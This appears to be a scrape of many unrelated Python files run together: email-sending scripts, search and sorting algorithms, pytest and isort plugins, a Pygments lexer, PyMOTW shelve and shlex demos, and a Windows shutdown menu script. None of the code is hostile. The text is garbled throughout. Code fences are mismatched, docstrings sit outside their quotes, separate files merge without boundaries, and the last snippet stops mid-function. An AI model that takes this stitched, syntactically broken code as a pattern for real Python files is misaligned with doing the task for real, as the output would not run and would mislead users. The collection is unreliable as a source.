msg["From"] = _format_addr("Python <%s>" % from_addr)
msg["To"] = _format_addr(" <%s>" % to_addr)
msg["Subject"] = Header("SMTP……", "utf-8").encode()

server = smtplib.SMTP(smtp_server, 25)
server.set_debuglevel(1)
server.login(from_addr, password)
server.sendmail(from_addr, [to_addr], msg.as_string())
server.quit()

import smtplib

# REMEMBER : dont send mails through public computers or servers

# connecting to googles serevrs
serverToLogin = smtplib.SMTP("smtp.gmail.com", 587)
# Username
userName = str(input("Username for Gmail : "))
# password
password = str(input("Password Of Account : "))
# Logging in
serverToLogin.login(userName, password)


def sendMail():
    yourEmail = str(input("Your Email Address : "))  # senders email address
    toSendEmail = str(input("Receivers Email Address"))  # receivers email address
    messageHead = str(input("Message Head : "))  # Message head
    messageBody = str(input("Message : "))  # main message
    fullMessage = messageHead + "\n" + messageBody  # full message
    serverToLogin.sendmail(
        yourEmail, toSendEmail, fullMessage
    )  # sending email address through server


while True:
    toSendOrNot = str(input("Send or End : "))
    if toSendOrNot == "Send":
        print("\n")
        print(sendMail())
    else:
        quit()
````

```pySentinel class for constants with useful reprs"""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

class Sentinel(object):

    def __init__(self, name, module, docstring=None):
        self.name = name
        self.module = module
        if docstring:
            self.__doc__ = docstring


    def __repr__(self):
        return str(self.module)+'.'+self.name

```

````py
This is pure Python implementation of sentinel linear search algorithm

For doctests run following command:
python -m doctest -v sentinel_linear_search.py
or
python3 -m doctest -v sentinel_linear_search.py

For manual testing run:
python sentinel_linear_search.py```


```py


def sentinel_linear_search(sequence, target):
    """Pure implementation of sentinel linear search algorithm in Python

    :param sequence: some sequence with comparable items
    :param target: item value to search
    :return: index of found item or None if item is not found

    Examples:
    >>> sentinel_linear_search([0, 5, 7, 10, 15], 0)
    0

    >>> sentinel_linear_search([0, 5, 7, 10, 15], 15)
    4

    >>> sentinel_linear_search([0, 5, 7, 10, 15], 5)
    1

    >>> sentinel_linear_search([0, 5, 7, 10, 15], 6)

    """
    sequence.append(target)

    index = 0
    while sequence[index] != target:
        index += 1

    sequence.pop()

    if index == len(sequence):
        return None

    return index


if __name__ == "__main__":
    user_input = input("Enter numbers separated by comma:\n").strip()
    sequence = [int(item) for item in user_input.split(",")]

    target_input = input("Enter a single number to be found in the list:\n")
    target = int(target_input)
    result = sentinel_linear_search(sequence, target)
    if result is not None:
        print(f"{target} found at positions: {result}")
    else:
        print("Not found")
````

````py
    Implemented an algorithm using opencv to tone an image with sepia technique```


```py
from cv2 import destroyAllWindows, imread, imshow, waitKey


def make_sepia(img, factor: int):
    """
    Function create sepia tone.
    Source: https://en.wikipedia.org/wiki/Sepia_(color)
    """
    pixel_h, pixel_v = img.shape[0], img.shape[1]

    def to_grayscale(blue, green, red):
        """
        Helper function to create pixel's greyscale representation
        Src: https://pl.wikipedia.org/wiki/YUV
        """
        return 0.2126 * red + 0.587 * green + 0.114 * blue

    def normalize(value):
        """Helper function to normalize R/G/B value -> return 255 if value > 255"""
        return min(value, 255)

    for i in range(pixel_h):
        for j in range(pixel_v):
            greyscale = int(to_grayscale(*img[i][j]))
            img[i][j] = [
                normalize(greyscale),
                normalize(greyscale + factor),
                normalize(greyscale + 2 * factor),
            ]

    return img


if __name__ == "__main__":
    # read original image
    images = {
        percentage: imread("image_data/lena.jpg", 1) for percentage in (10, 20, 30, 40)
    }

    for percentage, img in images.items():
        make_sepia(img, percentage)

    for percentage, img in images.items():
        imshow(f"Original image with sepia (factor: {percentage})", img)

    waitKey(0)
    destroyAllWindows()

#!/usr/bin/env python
````

````py
Solution to Project Euler Problems
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Mthematical series.```


```py
import math
from math import sqrt
from itertools import count
from memoization import memoize


@memoize
def factorial(n):
    return math.factorial(n)


def all_fibs(limit=None):
    a = b = 1
    while limit is None or a < limit:
        yield a
        a, b = b, a + b


def fibs(n):
    for i, f in enumerate(all_fibs()):
        if i >= n:
            break
        yield f


def sum_of_squares(n):
    return (n * (n + 1) * (2 * n + 1)) // 6


def square_of_sum(n):
    return (n ** 2 * (n + 1) ** 2) // 4


def is_triangle(n):
    assert n > 0
    c = (-1 + sqrt(1 + 8 * n)) / 2
    return c == int(c)


def triangles():
    for n in count(1):
        yield n * (n + 1) // 2


def is_pentagonal(n):
    assert n > 0
    c = (1 + sqrt(1 + 3 * 8 * n)) / 6
    return c == int(c)


def pentagonal(n):
    return n * (3 * n - 1) // 2


def pentagonals(upto=None):
    for n in count(1):
        p = pentagonal(n)
        if upto is not None and p > upto:
            break
        yield p


def is_exagonal(n):
    assert n > 0
    c = (1 + sqrt(1 + 8 * n)) / 4
    return c == int(c)


def exagonals():
    for n in count(1):
        yield n * (2 * n - 1)


def test():
    assert is_triangle(6)
    assert is_triangle(10)
    assert not is_triangle(5)
    assert is_pentagonal(5)
    assert is_pentagonal(12)
    assert is_exagonal(15)
    assert not is_exagonal(10)


if __name__ == "__main__":
    test()
    print(list(pentagonals(1)))
    print(list(pentagonals(5)))
    print(list(pentagonals(100)))

# server.py

import socket

HOST, PORT = '127.0.0.1', 1400

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

conn, addr = s.accept()

print('connected to:', addr)

while 1:
    data = conn.recv(1024)
    if not data:
        break
    conn.send(data + b' [ addition by server ]')

conn.close()

# -*- coding: utf-8 -*-```


```pyShim providing notebook.serverextensions stuff for pre 4.2 versions."""

try:
    # notebook >= 4.2
    from notebook.serverextensions import (
        ToggleServerExtensionApp, toggle_serverextension_python,
    )
except ImportError:
    # notebook <4.2
    from ._compat.serverextensions import (
        ToggleServerExtensionApp, toggle_serverextension_python,
    )

try:
    # notebook >= 5.0
    from notebook.extensions import ArgumentConflict
except ImportError:
    try:
        # notebook 4.2.x
        from notebook.serverextensions import ArgumentConflict
    except ImportError:
        # notebook < 4.2
        from ._compat.serverextensions import ArgumentConflict


__all__ = [
    'ArgumentConflict', 'ToggleServerExtensionApp',
    'toggle_serverextension_python',
]
````

````py
Sets are an unordered collection of unique values that can be modified at
runtime. This module shows how sets are created, iterated, accessed,
extended and shortened.```


```py


def main():
    # Let's define one `set` for starters
    simple_set = {0, 1, 2}

    # A set is dynamic like a `list` and `tuple`
    simple_set.add(3)
    simple_set.remove(0)
    assert simple_set == {1, 2, 3}

    # Unlike a `list and `tuple`, it is not an ordered sequence as it
    # does not allow duplicates to be added
    for _ in range(5):
        simple_set.add(0)
        simple_set.add(4)
    assert simple_set == {0, 1, 2, 3, 4}

    # Now let's define two new `set` collections
    multiples_two = set()
    multiples_four = set()

    # Fill sensible values into the set using `add`
    for i in range(10):
        multiples_two.add(i * 2)
        multiples_four.add(i * 4)

    # As we can see, both sets have similarities and differences
    assert multiples_two == {0, 2, 4, 6, 8, 10, 12, 14, 16, 18}
    assert multiples_four == {0, 4, 8, 12, 16, 20, 24, 28, 32, 36}

    # We cannot decide in which order the numbers come out - so let's
    # look for fundamental truths instead, such as divisibility against
    # 2 and 4. We do this by checking whether the modulus of 2 and 4
    # yields 0 (i.e. no remainder from performing a division)
    multiples_common = multiples_two.intersection(multiples_four)
    for number in multiples_common:
        assert number % 2 == 0 and number % 4 == 0

    # We can compute exclusive multiples
    multiples_two_exclusive = multiples_two.difference(multiples_four)
    multiples_four_exclusive = multiples_four.difference(multiples_two)
    assert len(multiples_two_exclusive) > 0
    assert len(multiples_four_exclusive) > 0

    # Numbers in this bracket are greater than 2 * 9 and less than 4 * 10
    for number in multiples_four_exclusive:
        assert 18 < number < 40

    # By computing a set union against the two sets, we have all integers
    # in this program
    multiples_all = multiples_two.union(multiples_four)

    # Check if set A is a subset of set B
    assert multiples_four_exclusive.issubset(multiples_four)
    assert multiples_four.issubset(multiples_all)

    # Check if set A is a subset and superset of itself
    assert multiples_all.issubset(multiples_all)
    assert multiples_all.issuperset(multiples_all)

    # Check if set A is a superset of set B
    assert multiples_all.issuperset(multiples_two)
    assert multiples_two.issuperset(multiples_two_exclusive)


if __name__ == "__main__":
    main()
````

````py
Set Matrix Zeroes

Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in-place.

Input:
[
  [1,1,1],
  [1,0,1],
  [1,1,1]
]
Output:
[
  [1,0,1],
  [0,0,0],
  [1,0,1]
]

=========================================
Use first column and first row for marking when 0 is found.
    Time Complexity:    O(N*M)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def set_matrix_zeroes(matrix):
    n = len(matrix)
    if n == 0:
        return
    m = len(matrix[0])

    # check if 0 exist in first row
    is_row = False
    for j in range(m):
        if matrix[0][j] == 0:
            is_row = True
    # check if 0 exist in first column
    is_col = False
    for i in range(n):
        if matrix[i][0] == 0:
            is_col = True

    # find which columns and rows should be 0
    for i in range(1, n):
        for j in range(1, m):
            if matrix[i][j] == 0:
                matrix[i][0] = matrix[0][j] = 0

    # set 0 if the row or column where this element is located is 0
    for i in range(1, n):
        for j in range(1, m):
            if (matrix[i][0] == 0) or (matrix[0][j] == 0):
                matrix[i][j] = 0

    # fill the first row with 0 if needed
    if is_row:
        for j in range(m):
            matrix[0][j] = 0
    # fill the first column with 0 if needed
    if is_col:
        for i in range(n):
            matrix[i][0] = 0


###########
# Testing #
###########

# Test 1
# Correct result => [[0, 0, 0, 0], [0, 4, 5, 0], [0, 3, 1, 0]]
mat = [[0, 1, 2, 0], [3, 4, 5, 2], [1, 3, 1, 5]]
set_matrix_zeroes(mat)
print(mat)

# Test 2
# Correct result => [[1, 0, 1], [0, 0, 0], [1, 0, 1]]
mat = [[1, 1, 1], [1, 0, 1], [1, 1, 1]]
set_matrix_zeroes(mat)
print(mat)
````

````py
Commonly used hooks for on_setattr.```


```py

from __future__ import absolute_import, division, print_function

from . import _config
from .exceptions import FrozenAttributeError


def pipe(*setters):
    """
    Run all *setters* and return the return value of the last one.

    .. versionadded:: 20.1.0
    """

    def wrapped_pipe(instance, attrib, new_value):
        rv = new_value

        for setter in setters:
            rv = setter(instance, attrib, rv)

        return rv

    return wrapped_pipe


def frozen(_, __, ___):
    """
    Prevent an attribute to be modified.

    .. versionadded:: 20.1.0
    """
    raise FrozenAttributeError()


def validate(instance, attrib, new_value):
    """
    Run *attrib*'s validator on *new_value* if it has one.

    .. versionadded:: 20.1.0
    """
    if _config._run_validators is False:
        return new_value

    v = attrib.validator
    if not v:
        return new_value

    v(instance, attrib, new_value)

    return new_value


def convert(instance, attrib, new_value):
    """
    Run *attrib*'s converter -- if it has one --  on *new_value* and return the
    result.

    .. versionadded:: 20.1.0
    """
    c = attrib.converter
    if c:
        return c(new_value)

    return new_value


NO_OP = object()```


```py
Sentinel for disabling class-wide *on_setattr* hooks for certain attributes.

Does not work in `pipe` or within lists.

.. versionadded:: 20.1.0```


```py

from typing import Generator
from typing import Optional
from typing import Union

import pytest
from _pytest._io.saferepr import saferepr
from _pytest.config import Config
from _pytest.config import ExitCode
from _pytest.config.argparsing import Parser
from _pytest.fixtures import FixtureDef
from _pytest.fixtures import SubRequest


def pytest_addoption(parser: Parser) -> None:
    group = parser.getgroup("debugconfig")
    group.addoption(
        "--setuponly",
        "--setup-only",
        action="store_true",
        help="only setup fixtures, do not execute tests.",
    )
    group.addoption(
        "--setupshow",
        "--setup-show",
        action="store_true",
        help="show setup of fixtures while executing tests.",
    )


@pytest.hookimpl(hookwrapper=True)
def pytest_fixture_setup(
    fixturedef: FixtureDef[object], request: SubRequest
) -> Generator[None, None, None]:
    yield
    if request.config.option.setupshow:
        if hasattr(request, "param"):
            # Save the fixture parameter so ._show_fixture_action() can
            # display it now and during the teardown (in .finish()).
            if fixturedef.ids:
                if callable(fixturedef.ids):
                    param = fixturedef.ids(request.param)
                else:
                    param = fixturedef.ids[request.param_index]
            else:
                param = request.param
            fixturedef.cached_param = param  # type: ignore[attr-defined]
        _show_fixture_action(fixturedef, "SETUP")


def pytest_fixture_post_finalizer(fixturedef: FixtureDef[object]) -> None:
    if fixturedef.cached_result is not None:
        config = fixturedef._fixturemanager.config
        if config.option.setupshow:
            _show_fixture_action(fixturedef, "TEARDOWN")
            if hasattr(fixturedef, "cached_param"):
                del fixturedef.cached_param  # type: ignore[attr-defined]


def _show_fixture_action(fixturedef: FixtureDef[object], msg: str) -> None:
    config = fixturedef._fixturemanager.config
    capman = config.pluginmanager.getplugin("capturemanager")
    if capman:
        capman.suspend_global_capture()

    tw = config.get_terminal_writer()
    tw.line()
    tw.write(" " * 2 * fixturedef.scopenum)
    tw.write(
        "{step} {scope} {fixture}".format(
            step=msg.ljust(8),  # align the output to TEARDOWN
            scope=fixturedef.scope[0].upper(),
            fixture=fixturedef.argname,
        )
    )

    if msg == "SETUP":
        deps = sorted(arg for arg in fixturedef.argnames if arg != "request")
        if deps:
            tw.write(" (fixtures used: {})".format(", ".join(deps)))

    if hasattr(fixturedef, "cached_param"):
        tw.write("[{}]".format(saferepr(fixturedef.cached_param, maxsize=42)))  # type: ignore[attr-defined]

    tw.flush()

    if capman:
        capman.resume_global_capture()


@pytest.hookimpl(tryfirst=True)
def pytest_cmdline_main(config: Config) -> Optional[Union[int, ExitCode]]:
    if config.option.setuponly:
        config.option.setupshow = True
    return None

from typing import Optional
from typing import Union

import pytest
from _pytest.config import Config
from _pytest.config import ExitCode
from _pytest.config.argparsing import Parser
from _pytest.fixtures import FixtureDef
from _pytest.fixtures import SubRequest


def pytest_addoption(parser: Parser) -> None:
    group = parser.getgroup("debugconfig")
    group.addoption(
        "--setupplan",
        "--setup-plan",
        action="store_true",
        help="show what fixtures and tests would be executed but "
        "don't execute anything.",
    )


@pytest.hookimpl(tryfirst=True)
def pytest_fixture_setup(
    fixturedef: FixtureDef[object], request: SubRequest
) -> Optional[object]:
    # Will return a dummy fixture if the setuponly option is provided.
    if request.config.option.setupplan:
        my_cache_key = fixturedef.cache_key(request)
        fixturedef.cached_result = (None, my_cache_key, None)
        return fixturedef.cached_result
    return None


@pytest.hookimpl(tryfirst=True)
def pytest_cmdline_main(config: Config) -> Optional[Union[int, ExitCode]]:
    if config.option.setupplan:
        config.option.setuponly = True
        config.option.setupshow = True
    return None

import glob
import os
import sys
from typing import Any, Dict, Iterator, List
from warnings import warn

import setuptools  # type: ignore

from . import api
from .settings import DEFAULT_CONFIG


class ISortCommand(setuptools.Command):  # type: ignore
    """The :class:`ISortCommand` class is used by setuptools to perform
    imports checks on registered modules.
    """

    description = "Run isort on modules registered in setuptools"
    user_options: List[Any] = []

    def initialize_options(self) -> None:
        default_settings = vars(DEFAULT_CONFIG).copy()
        for key, value in default_settings.items():
            setattr(self, key, value)

    def finalize_options(self) -> None:
        """Get options from config files."""
        self.arguments: Dict[str, Any] = {}  # skipcq: PYL-W0201
        self.arguments["settings_path"] = os.getcwd()

    def distribution_files(self) -> Iterator[str]:
        """Find distribution packages."""
        # This is verbatim from flake8
        if self.distribution.packages:  # pragma: no cover
            package_dirs = self.distribution.package_dir or {}
            for package in self.distribution.packages:
                pkg_dir = package
                if package in package_dirs:
                    pkg_dir = package_dirs[package]
                elif "" in package_dirs:  # pragma: no cover
                    pkg_dir = package_dirs[""] + os.path.sep + pkg_dir
                yield pkg_dir.replace(".", os.path.sep)

        if self.distribution.py_modules:
            for filename in self.distribution.py_modules:
                yield "%s.py" % filename
        # Don't miss the setup.py file itself
        yield "setup.py"

    def run(self) -> None:
        arguments = self.arguments
        wrong_sorted_files = False
        for path in self.distribution_files():
            for python_file in glob.iglob(os.path.join(path, "*.py")):
                try:
                    if not api.check_file(python_file, **arguments):
                        wrong_sorted_files = True  # pragma: no cover
                except OSError as error:  # pragma: no cover
                    warn(f"Unable to parse file {python_file} due to {error}")
        if wrong_sorted_files:
            sys.exit(1)  # pragma: no cover
````

````py
    pygments.lexers.sgf
    ~~~~~~~~~~~~~~~~~~~

    Lexer for Smart Game Format (sgf) file format.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Name, Literal, String, Text, Punctuation

__all__ = ["SmartGameFormatLexer"]


class SmartGameFormatLexer(RegexLexer):
    """
    Lexer for Smart Game Format (sgf) file format.

    The format is used to store game records of board games for two players
    (mainly Go game).
    For more information about the definition of the format, see:
    https://www.red-bean.com/sgf/

    .. versionadded:: 2.4
    """
    name = 'SmartGameFormat'
    aliases = ['sgf']
    filenames = ['*.sgf']

    tokens = {
        'root': [
            (r'[\s():;]', Punctuation),
            # tokens:
            (r'(A[BW]|AE|AN|AP|AR|AS|[BW]L|BM|[BW]R|[BW]S|[BW]T|CA|CH|CP|CR|'
             r'DD|DM|DO|DT|EL|EV|EX|FF|FG|G[BW]|GC|GM|GN|HA|HO|ID|IP|IT|IY|KM|'
             r'KO|LB|LN|LT|L|MA|MN|M|N|OB|OM|ON|OP|OT|OV|P[BW]|PC|PL|PM|RE|RG|'
             r'RO|RU|SO|SC|SE|SI|SL|SO|SQ|ST|SU|SZ|T[BW]|TC|TE|TM|TR|UC|US|VW|'
             r'V|[BW]|C)',
             Name.Builtin),
            # number:
            (r'(\[)([0-9.]+)(\])',
             bygroups(Punctuation, Literal.Number, Punctuation)),
            # date:
            (r'(\[)([0-9]{4}-[0-9]{2}-[0-9]{2})(\])',
             bygroups(Punctuation, Literal.Date, Punctuation)),
            # point:
            (r'(\[)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation)),
            # double points:
            (r'(\[)([a-z]{2})(:)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation, String, Punctuation)),

            (r'(\[)([\w\s#()+,\-.:?]+)(\])',
             bygroups(Punctuation, String, Punctuation)),
            (r'(\[)(\s.*)(\])',
             bygroups(Punctuation, Text, Punctuation)),
        ],
    }

```









---


```py



def func():
    print('This func() comes from the installed '
          'version of nested.shallow')

import math


class Rectangle:
    def __init__(self, width, height):
        self.width = width
        self.height = height

    def set_width(self, w):
        self.width = w
        return

    def set_height(self, h):
        self.height = h
        return

    def get_area(self):
        return self.width * self.height

    def get_perimeter(self):
        return 2 * (self.width + self.height)

    def get_diagonal(self):
        return math.sqrt(self.width * self.width + self.height * self.height)

    def get_picture(self):
        if self.width > 50 or self.height > 50:
            return "Too big for picture."

        return ("*" * self.width + "\n") * self.height

    def get_amount_inside(self, rect):
        return (self.width // rect.width) * (self.height // rect.height)

    def __str__(self):
        return "Rectangle(width={}, height={})".format(self.width, self.height)


class Square(Rectangle):
    def __init__(self, w):
        super().__init__(w, w)

    def set_side(self, w):
        super().set_height(w)
        super().set_width(w)

    def set_width(self, w):
        self.set_side(w)

    def set_height(self, h):
        self.set_side(h)

    def __str__(self):
        return "Square(side={})".format(self.width)

def shell_sort(arr):
    """ Shell Sort
        Complexity: O(n^2)
    """
    n = len(arr)
    # Initialize size of the gap
    gap = n // 2

    while gap > 0:
        y_index = gap
        while y_index < len(arr):
            y = arr[y_index]
            x_index = y_index - gap
            while x_index >= 0 and y < arr[x_index]:
                arr[x_index + gap] = arr[x_index]
                x_index = x_index - gap
            arr[x_index + gap] = y
            y_index = y_index + 1
        gap = gap // 2

    return arr

#!/usr/bin/env python3```


```pyCreating a new shelf.```


```py

#end_pymotw_header
import shelve

with shelve.open('test_shelf.db') as s:
    s['key1'] = {
        'int': 10,
        'float': 9.5,
        'string': 'Sample data',
    }

#!/usr/bin/env python3```


```pyOpening an existing shelf.```


```py

#end_pymotw_header
import shelve

with shelve.open('test_shelf.db') as s:
    existing = s['key1']

print(existing)

#!/usr/bin/env python3```


```pyOpening an existing shelf read-only.```


```py

#end_pymotw_header
import dbm
import shelve

with shelve.open('test_shelf.db', flag='r') as s:
    print('Existing:', s['key1'])
    try:
        s['key1'] = 'new value'
    except dbm.error as err:
        print('ERROR: {}'.format(err))

#!/usr/bin/env python3```


```pyModifying an existing shelf opened with write-back enabled.```


```py

#end_pymotw_header
import shelve

with shelve.open('test_shelf.db') as s:
    print(s['key1'])
    s['key1']['new_value'] = 'this was not here before'

with shelve.open('test_shelf.db', writeback=True) as s:
    print(s['key1'])

#!/usr/bin/env python3```


```pyModifying an existing shelf opened with write-back enabled.```


```py

#end_pymotw_header
import shelve
import pprint

with shelve.open('test_shelf.db', writeback=True) as s:
    print('Initial data:')
    pprint.pprint(s['key1'])

    s['key1']['new_value'] = 'this was not here before'
    print('\nModified:')
    pprint.pprint(s['key1'])

with shelve.open('test_shelf.db', writeback=True) as s:
    print('\nPreserved:')
    pprint.pprint(s['key1'])

# -*- coding=utf-8 -*-```


```py
Main module with magic self-replacement mechanisms to handle import speedups.```


```py
from __future__ import absolute_import

import sys
import types

from packaging.version import parse as parse_version

from .models import (
    ShimmedPathCollection,
    get_package_finder,
    import_pip,
    lookup_current_pip_version,
)


class _shims(types.ModuleType):
    CURRENT_PIP_VERSION = str(lookup_current_pip_version())

    @classmethod
    def parse_version(cls, version):
        return parse_version(version)

    def __dir__(self):
        result = list(self._locations.keys()) + list(self.__dict__.keys())
        result.extend(
            (
                "__file__",
                "__doc__",
                "__all__",
                "__docformat__",
                "__name__",
                "__path__",
                "__package__",
                "__version__",
            )
        )
        return result

    @classmethod
    def _new(cls):
        return cls()

    @property
    def __all__(self):
        return list(self._locations.keys())

    def __init__(self):
        self.pip = import_pip()
        self._locations = ShimmedPathCollection.get_registry()
        self._locations["get_package_finder"] = get_package_finder
        self.pip_version = str(lookup_current_pip_version())
        self.parsed_pip_version = lookup_current_pip_version()

    def __getattr__(self, *args, **kwargs):
        locations = super(_shims, self).__getattribute__("_locations")
        if args[0] in locations:
            return locations[args[0]].shim()
        return super(_shims, self).__getattribute__(*args, **kwargs)


old_module = sys.modules[__name__] if __name__ in sys.modules else None
module = sys.modules[__name__] = _shims()
module.__dict__.update(
    {
        "__file__": __file__,
        "__package__": __package__,
        "__doc__": __doc__,
        "__all__": module.__all__,
        "__name__": __name__,
    }
)

from flask_wtf import FlaskForm
from wtforms.fields import StringField, BooleanField, SubmitField, SelectField
from wtforms.validators import DataRequired
from app.map.map import map


dr = [DataRequired()]

origins = [(origin, origin) for origin in map]
print(origins)


class ShippingForm(FlaskForm):
    sender = StringField("Sender Name", dr)
    recipient = StringField("Recipient Name", dr)
    origin = SelectField("Origin", choices=origins)
    destination = SelectField("Destination", choices=origins)
    express = BooleanField("Express Shipping")
    submit = SubmitField("Send package")

#!/usr/bin/env python3```


```pyHandling parse errors.```


```py

#end_pymotw_header
import shlex

text = """This line is ok.
This line has an "unfinished quote.
This line is ok, too.```


```py

print('ORIGINAL: {!r}'.format(text))
print()

lexer = shlex.shlex(text)

print('TOKENS:')
try:
    for token in lexer:
        print('{!r}'.format(token))
except ValueError as err:
    first_line_of_error = lexer.token.splitlines()[0]
    print('ERROR: {} {}'.format(lexer.error_leader(), err))
    print('following {!r}'.format(first_line_of_error))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyParsing strings with shlex.```


```py

#end_pymotw_header
import shlex
import sys

if len(sys.argv) != 2:
    print('Please specify one filename on the command line.')
    sys.exit(1)

filename = sys.argv[1]
with open(filename, 'r') as f:
    body = f.read()
print('ORIGINAL: {!r}'.format(body))
print()

print('TOKENS:')
lexer = shlex.shlex(body)
for token in lexer:
    print('{!r}'.format(token))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyDifferences between POSIX and non-POSIX parsing.```


```py

#end_pymotw_header
import shlex

examples = [
    'Do"Not"Separate',
    '"Do"Separate',
    'Escaped \e Character not in quotes',
    'Escaped "\e" Character in double quotes',
    "Escaped '\e' Character in single quotes",
    r"Escaped '\'' \"\'\" single quote",
    r'Escaped "\"" \'\"\' double quote',
    "\"'Strip extra layer of quotes'\"",
]

for s in examples:
    print('ORIGINAL : {!r}'.format(s))
    print('non-POSIX: ', end='')

    non_posix_lexer = shlex.shlex(s, posix=False)
    try:
        print('{!r}'.format(list(non_posix_lexer)))
    except ValueError as err:
        print('error({})'.format(err))

    print('POSIX    : ', end='')
    posix_lexer = shlex.shlex(s, posix=True)
    try:
        print('{!r}'.format(list(posix_lexer)))
    except ValueError as err:
        print('error({})'.format(err))

    print()

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyDifferences between POSIX and non-POSIX parsing.```


```py

#end_pymotw_header
import shlex

examples = [
    "Embedded'SingleQuote",
    'Embedded"DoubleQuote',
    'Embedded Space',
    '~SpecialCharacter',
    r'Back\slash',
]

for s in examples:
    print('ORIGINAL : {}'.format(s))
    print('QUOTED   : {}'.format(shlex.quote(s)))
    print()

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyIncluding content from other files in the token stream.```


```py

#end_pymotw_header
import shlex

text = "This text says to source quotes.txt before continuing."
print('ORIGINAL: {!r}'.format(text))
print()

lexer = shlex.shlex(text)
lexer.wordchars += '.'
lexer.source = 'source'

print('TOKENS:')
for token in lexer:
    print('{!r}'.format(token))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pySplitting strings with shlex.```


```py

#end_pymotw_header
import shlex

text = """This text has "quoted parts" inside it."""
print('ORIGINAL: {!r}'.format(text))
print()

print('TOKENS:')
print(shlex.split(text))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyOther uses for the parser.```


```py

#end_pymotw_header
import shlex

text = """|Col 1||Col 2||Col 3|"""
print('ORIGINAL: {!r}'.format(text))
print()

lexer = shlex.shlex(text)
lexer.quotes = '|'

print('TOKENS:')
for token in lexer:
    print('{!r}'.format(token))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyParsing strings with shlex.```


```py

#end_pymotw_header
import shlex
import sys

if len(sys.argv) != 2:
    print('Please specify one filename on the command line.')
    sys.exit(1)

filename = sys.argv[1]
with open(filename, 'r') as f:
    body = f.read()
print('ORIGINAL: {!r}'.format(body))
print()

print('TOKENS:')
lexer = shlex.shlex(body)
lexer.whitespace += '.,'
for token in lexer:
    print('{!r}'.format(token))

def findShortestSubArray(nums):
    shortest_dist = len(nums)
    max_counts = 1
    d = {}
    for i in range(len(nums)):
        if nums[i] in d:
            d[nums[i]][0] += 1
            if d[nums[i]][0] > max_counts:
                shortest_dist = i - d[nums[i]][1]
                max_counts = d[nums[i]][0]
            elif d[nums[i]][0] == max_counts:
                dist = i - d[nums[i]][1]
                if dist < shortest_dist:
                    shortest_dist = dist
        else:
            d[nums[i]] = [1, i]
    if max_counts == 1:
        return 1
    return shortest_dist + 1


print(findShortestSubArray([1, 2, 2, 3, 1, 4, 2]))

import pyshorteners

link = input("Enter the URL : ")

shortener = pyshorteners.Shortener()

shortLink = shortener.tinyurl.short(link)

print("shortend URL  : ", shortLink)
````

````py
Shuffle an Array

Given an array (array elements could be of any type/kind),
write a program to generate in-place a random permutation of array elements.
This question is also asked as “shuffle a deck of cards” or “randomize a given array”.
Here shuffle means that every permutation of array element should equally likely.

Input: [1, 2, 3]
Output: This is a nondeterministic algorithm, N! solutions/permutations exist.
    In this case 3! = 6. All permutations are a valid solution.
    [1, 2, 3], [1, 3, 2], [2, 1, 3], [2, 3, 1], [3, 1, 2], [3, 2, 1]

=========================================
Easy in-place solution, choose an random index/position from I (I is the current position) to N-1
(or choose from 0 to I, it's same), swap the element at random position with the element at I position.
Increase I and continue with the same algorithm.
This algorithm is called Fisher–Yates shuffle (https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle).
    Time Complexity:    O(N)
    Space Complexity:   O(1)

Note: In Python there is already implemented shuffle (in random module "from random import shuffle") method
which works in similar way. But it's easy to be implemented and I wanted to show how to implement it.```


```py


############
# Solution #
############

from random import randint


def shuffle_array(arr):
    n = len(arr)

    for i in range(n):
        rand = randint(i, n - 1)  # or randint(0, i) it's same
        arr[i], arr[rand] = arr[rand], arr[i]  # swap elements

    # the original arr is already changed
    return arr


###########
# Testing #
###########

# Test 1
# Correct result => One of these: [1, 2, 3], [1, 3, 2], [2, 1, 3], [2, 3, 1], [3, 1, 2], [3, 2, 1]
print(shuffle_array([1, 2, 3]))

# Script to Shurdown/Restart the Computer (User Choice based)

import os

print(
    "This program will be used to shudown/restart the system. Please select your choice: "
)
print("1. Shutdown Computer Immediately")
print("2. Shutdown Computer after Given Time")
print("3. Restart Computer Immediately")
print("4. Restart Computer after Given Time")
print("5. Exit")
print(end="Enter Your Choice: ")
choice = int(input())

if choice == 1:
    os.system("shutdown /s /t 0")
elif choice == 2:
    print(end="Enter Number of Seconds: ")
    sec = int(input())
    strOne = "shutdown /s /t "
    strTwo = str(sec)
    str = strOne + strTwo
    os.system(str)
elif choice == 3:
    os.system("shutdown /r /t 0")
elif choice == 4:
    print(end="Enter Number of Seconds: ")
    sec = int(input())
    strOne = "shutdown /r /t "
    strTwo = str(sec)
    str = strOne + strTwo
    os.system(str)
elif choice == 5:
    exit()
else:
    print("Wrong Choice!")
````

`pyHTTP handler to shut down the notebook server.`

````py
from tornado import web, ioloop
from notebook.base.handlers import IPythonHandler

class ShutdownHandler(IPythonHandler):
    @web.authenticated
    def post(self):
        self.log.info("Shutting down on /api/shutdown request.")
        ioloop.IOLoop.current().stop()


default_handlers = [
    (r"/api/shutdown", ShutdownHandler),
]

#!/usr/bin/env python3```


```pyCopying a file```


```py

#end_pymotw_header
import glob
import os
import shutil

os.mkdir('example')
print('BEFORE:', glob.glob('example/*'))

shutil.copy('shutil_copy.py', 'example')

print('AFTER :', glob.glob('example/*'))

#!/usr/bin/env python3```


```pyCopying a file```


```py

#end_pymotw_header
import os
import shutil
import time


def show_file_info(filename):
    stat_info = os.stat(filename)
    print('  Mode    :', oct(stat_info.st_mode))
    print('  Created :', time.ctime(stat_info.st_ctime))
